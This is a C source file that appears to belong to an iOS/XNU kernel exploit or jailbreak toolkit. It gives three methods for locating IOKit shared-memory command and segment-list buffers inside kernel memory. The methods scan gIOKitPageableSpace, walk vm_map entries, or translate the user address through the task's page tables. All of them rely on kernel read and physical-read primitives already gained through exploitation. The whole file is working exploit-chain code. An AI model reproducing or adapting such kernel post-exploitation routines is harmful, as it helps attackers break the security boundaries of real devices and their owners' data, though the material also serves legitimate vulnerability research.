#include "offsets.h"
#include "kexecute.h"
#include "find_shmem.h"
#include "find_port.h"
#include "kutils.h"
#include "krw.h"
#include "pte.h"
#include "helper/translations.h"

#include "../print.h"

// Solution 1
// Just add +0x1000 address from gIOKitPageableSpace_start and check if signature exist when read
void find_shmem_in_kernel(uint64_t *kva1, uint64_t *kva2, uint64_t command_buffer_shmem_sig, uint64_t segment_list_shmem_sig) {
    uint64_t command_buffer_shmem_data_kva = 0;
	uint64_t segment_list_shmem_data_kva = 0;
	uint64_t gIOKitPageableSpace_start = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x10);
	uint64_t gIOKitPageableSpace_end = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x18);

	int i = 0;

	while(1) {
		uint64_t current_kva = gIOKitPageableSpace_start + i * 0x1000;

		if(current_kva > gIOKitPageableSpace_end) {
			ERROR("failed to find where shmem allocated in kernel\n");
			break;
		}

		//check if valid readable kernel address to prevent kernel panic
		uint64_t current_pa = kvtophys(current_kva);
		if(current_pa == 0) continue;

		if(physread64(current_pa) == command_buffer_shmem_sig) {
			INFO("Found command_buffer_shmem in kernel: 0x%llx\n", current_kva-0x1000);
			command_buffer_shmem_data_kva = current_kva-0x1000;
            *kva1 = command_buffer_shmem_data_kva;
		}

		if(physread64(current_pa) == segment_list_shmem_sig) {
			INFO("Found segment_list_shmem in kernel: 0x%llx\n", current_kva-0x1000);
			segment_list_shmem_data_kva = current_kva-0x1000;
            *kva2 = segment_list_shmem_data_kva;
		}

		if(segment_list_shmem_data_kva && command_buffer_shmem_data_kva) break;

		i++;
	}
}


// Solution 2
// Iterating vm_map, and check if signature exist when read gIOKitPageableSpace_map_start+0x1000
void find_shmem_in_kernel_2(uint64_t *kva1, uint64_t *kva2, uint64_t command_buffer_shmem_sig, uint64_t segment_list_shmem_sig) {
	uint64_t command_buffer_shmem_data_kva = 0;
	uint64_t segment_list_shmem_data_kva = 0;

	uint64_t gIOKitPageableSpace_start = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x10);
	uint64_t gIOKitPageableSpace_end = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x18);
	uint64_t gIOKitPageableSpace_map = kread64(ksym(KSYMBOL_gIOKitPageableSpace) + 0x8);

	// khexdump(gIOKitPageableSpace_map, 0x100);

	// 00000000 struct __attribute__((aligned(8))) _vm_map // sizeof=0xF8
// 00000000 {
// 00000000     lck_rw_t_0 lock;
// 00000010     vm_map_header hdr; <- HERE !!!!

// 00000000 struct __attribute__((aligned(8))) vm_map_header // sizeof=0x38
// 00000000 {                                       // XREF: _vm_map/r _vm_map_0/r ...
// 00000000     vm_map_links links;                 // XREF: vm_map_remap:loc_FFFFFF8000448364/r <- HERE !!!!

// 00000000 struct vm_map_links // sizeof=0x20
// 00000000 {                                       // XREF: vm_map_header/r
// 00000000                                         // vm_map_entry/r
// 00000000     vm_map_entry *prev;                 // XREF: vm_fault_wire+CC/w
// 00000000                                         // vm_fault_wire+357/w ...
// 00000008     vm_map_entry *next;                 // XREF: vm_fault_wire+C4/w
// 00000008                                         // vm_fault_wire+4C2/w ...
// 00000010     vm_map_offset_t start;              // XREF: vm_fault_wire+BC/w
// 00000010                                         // vm_map_delete+D4E/r ...
// 00000018     vm_map_offset_t end;                // XREF: vm_fault_wire+B4/w
// 00000018                                         // vm_fault_wire+5FE/w ...
// 00000020 };

	uint64_t gIOKitPageableSpace_map_prev = kread64(gIOKitPageableSpace_map+0x10);	//0x10 = vme_prev
	uint64_t gIOKitPageableSpace_map_next = kread64(gIOKitPageableSpace_map+0x18);	//0x18 = vme_next
	uint64_t gIOKitPageableSpace_map_start = kread64(gIOKitPageableSpace_map+0x20);	//0x18 = start
	uint64_t gIOKitPageableSpace_map_end = kread64(gIOKitPageableSpace_map+0x28);	//0x18 = end
	
#if VERBOSE_LOG
	INFO("gIOKitPageableSpace_map = 0x%llx\n", gIOKitPageableSpace_map);

	printf("gIOKitPageableSpace_map's prev = 0x%llx\n", gIOKitPageableSpace_map_prev);
	printf("gIOKitPageableSpace_map's next = 0x%llx\n", gIOKitPageableSpace_map_next);
	printf("gIOKitPageableSpace_map's start = 0x%llx\n", gIOKitPageableSpace_map_start);
	printf("gIOKitPageableSpace_map's end = 0x%llx\n", gIOKitPageableSpace_map_end);

	printf("Going to gIOKitPageableSpace_map's next\n");
#endif
	uint64_t current_map = gIOKitPageableSpace_map_next;

	int i = 0;
	while(1) {
		
		uint64_t current_map_start = kread64(current_map + 0x10);
		uint64_t current_map_end = kread64(current_map + 0x18);
		uint64_t current_map_prev = kread64(current_map + 0x0);
		uint64_t current_map_next = kread64(current_map + 0x8);

#if VERBOSE_LOG
		printf("=============\n");
		printf("current_map_start = 0x%llx, current_map_end = 0x%llx\n", current_map_start, current_map_end);
		printf("current_map_prev = 0x%llx, current_map_next = 0x%llx\n", current_map_prev, current_map_next);
		printf("=============\n");
#endif
		current_map = current_map_next;

		// if(bruh == current_map_start) {
		// 	printf("!===========!\n");
		// 	printf("current_map_start = 0x%llx, current_map_end = 0x%llx\n", current_map_start, current_map_end);
		// 	printf("current_map_prev = 0x%llx, current_map_next = 0x%llx\n", current_map_prev, current_map_next);
		// 	printf("!===========!\n");
		// 	// break;
		// }

		//check if valid readable kernel address to prevent kernel panic
		uint64_t pa = kvtophys(current_map_start + 0x1000);
		if(pa == 0) continue;

		if(physread64(pa) == command_buffer_shmem_sig) {
			INFO("Found command_buffer_shmem in kernel: 0x%llx\n", current_map_start);
			command_buffer_shmem_data_kva = current_map_start;
            *kva1 = command_buffer_shmem_data_kva;
		}
		if(physread64(pa) == segment_list_shmem_sig) {
			INFO("Found segment_list_shmem in kernel: 0x%llx\n", current_map_start);
			segment_list_shmem_data_kva = current_map_start;
            *kva2 = segment_list_shmem_data_kva;
		}

		// we've all found
		if(segment_list_shmem_data_kva && command_buffer_shmem_data_kva) break;

		if(!current_map_next || !current_map_start) break;
		if(current_map_next == gIOKitPageableSpace_map_next) break;
	}
}

// Solution 3
// Translate to physical address from userspace adddress, and then translate to kernel virtual address from physical address again!
void find_shmem_in_kernel_3(uint64_t *kva1, uint64_t *kva2, uint64_t shmem_cmdbuf_ua, uint64_t shmem_seglist_ua, uint64_t command_buffer_shmem_sig, uint64_t segment_list_shmem_sig) {
	uint64_t our_task = task_self_addr();
	uint64_t our_pmap = get_task_pmap(our_task);
	uint64_t our_ttep = kread64(our_pmap + off_pmap_ttep);

	uint64_t leafLevel = PMAP_TT_L3_LEVEL;

	//1
	uint64_t pa = vtophys_lvl(our_ttep, (uint64_t)(shmem_cmdbuf_ua), &leafLevel, NULL);
	// printf("[+] shmem_cmdbuf_ua = 0x%llx -> pa = 0x%llx\n", (uint64_t)(shmem_cmdbuf_ua), pa);
	
	uint64_t kva = phystokv(pa);
	if(kread64(kva + 0x1000) == command_buffer_shmem_sig) {
		// INFO("Found command_buffer_shmem in kernel: 0x%llx\n", kva);
		*kva1 = kva;
	}

	//2
	pa = vtophys_lvl(our_ttep, (uint64_t)(shmem_seglist_ua), &leafLevel, NULL);
	// printf("[+] shmem_seglist_ua = 0x%llx -> pa = 0x%llx\n", (uint64_t)(shmem_seglist_ua), pa);
	
	kva = phystokv(pa);
	if(kread64(kva + 0x1000) == segment_list_shmem_sig) {
		// INFO("Found segment_list_shmem in kernel: 0x%llx\n", kva);
		*kva2 = kva;
	}
}